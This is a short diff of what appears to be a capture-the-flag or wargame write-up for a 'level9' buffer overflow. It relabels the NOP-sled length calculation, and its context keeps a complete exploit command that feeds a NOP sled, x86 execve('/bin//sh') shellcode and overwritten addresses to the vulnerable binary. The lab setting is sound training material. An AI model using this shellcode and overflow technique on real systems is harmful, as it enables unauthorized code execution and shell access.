@@ -25,7 +25,7 @@ Breakpoint 1 at 0x804867c
 ```
 buffer address : 0x804a00c\
 address buffer + 4 : 0x804a010\
-108 - 25 - 4 = 79
+NOP-sed length : 108 - 25 - 4 = 79
 
 ```
 $ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x90" * 79 +  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x0c\xa0\x04\x08"')
